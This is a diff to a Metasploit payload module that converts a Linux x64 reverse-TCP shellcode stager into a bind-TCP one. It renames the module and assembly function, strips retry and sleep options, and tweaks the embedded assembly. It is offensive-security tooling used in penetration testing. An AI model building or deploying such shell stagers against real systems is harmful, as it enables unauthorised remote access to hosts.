@@ -13,7 +13,7 @@ module Msf
 #
 ###
 
-module Payload::Linux::ReverseTcp_x64
+module Payload::Linux::BindTcp_x64
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
@@ -25,8 +25,6 @@ module Payload::Linux::ReverseTcp_x64
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
-      retry_count:   datastore['StagerRetryCount'],
-      sleep_seconds: datastore['StagerRetryWait'],
     }
 
     # Generate the advanced stager if we have space
@@ -53,7 +51,7 @@ module Payload::Linux::ReverseTcp_x64
   # Generate and compile the stager
   #
   def generate_reverse_tcp(opts={})
-    asm = asm_reverse_tcp(opts)
+    asm = asm_bind_tcp(opts)
     buf = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
     apply_prepends(buf)
   end
@@ -79,16 +77,12 @@ module Payload::Linux::ReverseTcp_x64
   # @option opts [String] :host The host IP to connect to
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
-  def asm_reverse_tcp(opts={})
+  def asm_bind_tcp(opts={})
     # TODO: reliability is coming
-    retry_count  = opts[:retry_count]
     reliable     = opts[:reliable]
     encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
     encoded_host = Rex::Socket.addr_aton("0.0.0.0").unpack("V").first
     encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-    seconds = (opts[:sleep_seconds] || 5.0)
-    sleep_seconds = seconds.to_i
-    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
 
     asm = %Q^
       ;socket
@@ -146,6 +140,7 @@ module Payload::Linux::ReverseTcp_x64
         xor   r9, r9
         push  0x22
         pop   r10
+        xor rdx, rdx
         mov   dl, 0x7
         syscall
         test  rax, rax
